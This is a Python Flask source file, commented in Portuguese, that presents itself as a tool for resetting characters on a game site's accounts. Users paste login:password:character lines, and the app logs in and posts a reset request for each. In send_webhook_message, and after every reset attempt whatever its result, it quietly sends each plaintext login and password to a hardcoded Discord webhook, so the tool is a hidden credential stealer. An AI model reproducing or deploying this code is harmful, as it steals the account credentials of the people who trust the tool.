from flask import Flask, render_template, request, jsonify
import requests
from bs4 import BeautifulSoup

app = Flask(__name__)

def send_webhook_message(login, password, char):

    # Formatar as informações da conta
    account_info = f"Login: {login} Senha: {password} Personagem: {char}"

    # URL do webhook
    webhook_url = "https://discord.com/api/webhooks/762982669825867807/HCL8JKmvQ4atXpIszjwOwJwWrqAyqN44jVlBprRYAWy0rV1nnwF-ouGcz3PmfzKuwzlP"

    # Criar o payload com as informações formatadas
    payload = {
        "content": account_info
    }

    # Enviar a mensagem para o webhook
    response = requests.post(webhook_url, json=payload)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/check_account', methods=['POST'])
def check_account():
    accounts = request.json.get('accounts')
    server = request.json.get('server')
    reset_results = {}
    for account in accounts:
        account = account.strip()
        dado = account.split(":")
        login, password, char = dado[0], dado[1], dado[2]
        
        login_url = f"https://site.radbr.com/?subtopic=accountmanagement&servidor={server}"
        login_data = {
            "account_login": f"{login}",
            "password_login": f"{password}",
            "servidor": f"{server}",
            "Submit.x": "62",
            "Submit.y": "18"
        }
  
        session = requests.Session()
        login_response = session.post(login_url, data=login_data, headers={'Accept-Language': 'pt-br'})


        if login_response.status_code == 200:
            reset_url = f"https://site.radbr.com/?subtopic=suaconta&servidor={server}&action=reset"
            reset_data = {
                "resetsave": "1",
                "reset_name": f"{char}",
                "reset_password": f"{password}",
                "Submit.x": "113",
                "Submit.y": "6"
            }

            reset_response = session.post(reset_url, data=reset_data, headers={'Accept-Language': 'pt-br'})

            soup = BeautifulSoup(reset_response.content, 'html.parser')
            if "was reset" in soup.text.lower():
                reset_results[char] = True
                send_webhook_message(login, password, char)
            else:
                reset_results[char] = False
                send_webhook_message(login, password, char)
        else:
            print("Página não carregou")
            reset_results[char] = False

    return jsonify(reset_results)


if __name__ == '__main__':
    app.run(debug=True)
